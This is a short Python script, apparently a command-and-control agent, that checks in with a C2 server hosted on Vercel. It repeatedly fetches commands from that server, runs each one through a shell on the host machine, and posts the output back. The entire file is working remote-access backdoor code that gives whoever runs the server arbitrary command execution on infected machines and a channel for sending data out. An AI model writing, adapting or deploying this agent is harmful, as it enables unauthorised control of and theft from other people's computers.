#!/usr/bin/env python3
"""
C2 Agent — connects to Vercel C2 server
Usage: python3 agent.py --url https://your-c2.vercel.app --key YOUR_SECRET
"""
import os, sys, subprocess, platform, time, uuid, socket
import requests, argparse

def get_id():
    h = platform.node() + str(uuid.getnode())
    return hex(abs(hash(h)))[2:10]

def exec_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (r.stdout + r.stderr).strip() or "[no output]"
    except Exception as e:
        return f"[error] {e}"

def run(url, key, interval=10):
    agent_id = get_id()
    headers = {"X-API-Key": key, "Content-Type": "application/json"}
    print(f"[*] Agent ID: {agent_id} | C2: {url}")

    while True:
        try:
            r = requests.post(url, headers=headers,
                json={"action": "checkin", "agent_id": agent_id}, timeout=10)
            data = r.json()
            cmd = data.get("cmd")
            if cmd:
                print(f"[>] {cmd}")
                out = exec_cmd(cmd)
                print(f"[<] {out[:200]}")
                requests.post(url, headers=headers,
                    json={"action": "result", "agent_id": agent_id, "data": out}, timeout=10)
        except Exception as e:
            print(f"[!] {e}")
        time.sleep(interval)

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--key", required=True)
    p.add_argument("--interval", type=int, default=10)
    args = p.parse_args()
    run(args.url, args.key, args.interval)
